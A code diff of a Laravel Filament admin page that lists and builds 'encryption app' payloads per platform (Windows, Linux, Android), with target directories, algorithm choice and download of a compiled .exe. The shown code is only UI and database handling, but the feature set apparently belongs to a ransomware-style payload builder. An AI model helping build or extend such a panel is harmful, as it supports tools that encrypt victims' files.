@@ -24,6 +24,7 @@ class EncryptionApps extends Page implements HasTable
     use InteractsWithTable;
 
     public ?array $profilePreview = [];
+
     protected static ?string $title = 'Encryption Apps';
 
     protected ?string $subheading = 'Configure and build platform-specific payloads for encryption operations.';
@@ -38,49 +39,49 @@ class EncryptionApps extends Page implements HasTable
 
     protected static string $view = 'filament.admin.pages.encryption-apps';
 
-public function table(Table $table): Table
-        {
-            return $table
-                ->query(Payload::query())
-                ->columns([
-                    TextColumn::make('name')
-                        ->label('App Name')
-                        ->searchable()
-                        ->weight('bold'),
-                    TextColumn::make('target_os')
-                        ->label('Platform')
-                        ->badge()
-                        ->color(fn (string $state): string => match ($state) {
-                            'windows' => 'info',
-                            'linux' => 'success',
-                            'android' => 'warning',
-                            default => 'gray',
-                        }),
-                    TextColumn::make('encryption_type')
-                        ->label('Algorithm')
-                        ->formatStateUsing(fn (string $state): string => strtoupper($state)),
-                    TextColumn::make('status')
-                        ->label('Status')
-                        ->badge()
-                        ->color(fn (string $state): string => match ($state) {
-                            'ready' => 'success',
-                            'compiling' => 'warning',
-                            default => 'gray',
-                        }),
-                    TextColumn::make('created_at')
-                        ->label('Created At')
-                        ->dateTime(),
-                ])
-                ->actions([
-                    TableAction::make('download')
-                        ->label('Download')
-                        ->icon('heroicon-o-arrow-down-tray')
-                        ->color('success')
-                        ->button() // <--- هذه الخاصية تجعله يظهر كزر بارز وليس قائمة
-                        ->visible(fn (Payload $record): bool => $record->status === 'ready' && !empty($record->file_path))
-                        ->url(fn (Payload $record): string => Storage::url($record->file_path))
-                        ->openUrlInNewTab(),
-                ]);
+    public function table(Table $table): Table
+    {
+        return $table
+            ->query(Payload::query())
+            ->columns([
+                TextColumn::make('name')
+                    ->label('App Name')
+                    ->searchable()
+                    ->weight('bold'),
+                TextColumn::make('target_os')
+                    ->label('Platform')
+                    ->badge()
+                    ->color(fn (string $state): string => match ($state) {
+                        'windows' => 'info',
+                        'linux' => 'success',
+                        'android' => 'warning',
+                        default => 'gray',
+                    }),
+                TextColumn::make('encryption_type')
+                    ->label('Algorithm')
+                    ->formatStateUsing(fn (string $state): string => strtoupper($state)),
+                TextColumn::make('status')
+                    ->label('Status')
+                    ->badge()
+                    ->color(fn (string $state): string => match ($state) {
+                        'ready' => 'success',
+                        'compiling' => 'warning',
+                        default => 'gray',
+                    }),
+                TextColumn::make('created_at')
+                    ->label('Created At')
+                    ->dateTime(),
+            ])
+            ->actions([
+                TableAction::make('download')
+                    ->label('Download')
+                    ->icon('heroicon-o-arrow-down-tray')
+                    ->color('success')
+                    ->button()
+                    ->visible(fn (Payload $record): bool => $record->status === 'ready' && ! empty($record->file_path))
+                    ->url(fn (Payload $record): string => Storage::url($record->file_path))
+                    ->openUrlInNewTab(),
+            ]);
     }
 
     protected function getHeaderActions(): array
@@ -173,7 +174,7 @@ public function table(Table $table): Table
 
                     Section::make('Encryption preset')
                         ->schema([
-                            ToggleButtons::make('algorithm')
+                            ToggleButtons::make('encryption_type')
                                 ->label('Encryption type')
                                 ->options([
                                     'aes' => 'AES-256-GCM',
@@ -182,11 +183,28 @@ public function table(Table $table): Table
                                 ])
                                 ->inline()
                                 ->required()
-                                ->default('hybrid'),
+                                ->default('aes'),
                         ]),
                 ])
                 ->action(function (array $data, PayloadService $payloadService): void {
-                    $payloadService->createPayloadProfile($data);
+                    $payload = Payload::create([
+                        'name' => $data['app_name'],
+                        'target_os' => $data['platform'],
+                        'encryption_type' => $data['encryption_type'],
+                        'icon' => $data['icon'] ?? 'shield',
+                        'target_directories' => $data['target_directories'],
+                        'status' => 'compiling',
+                    ]);
+
+                    $filePath = $payloadService->createPayloadProfile($payload, $data['platform'], [
+                        'encryption_type' => $data['encryption_type'],
+                        'target_directories' => $data['target_directories'],
+                    ]);
+
+                    $payload->update([
+                        'file_path' => 'payloads/'.$payload->id.'.exe',
+                        'status' => 'ready',
+                    ]);
 
                     Notification::make()
                         ->title('Payload profile created and built successfully')
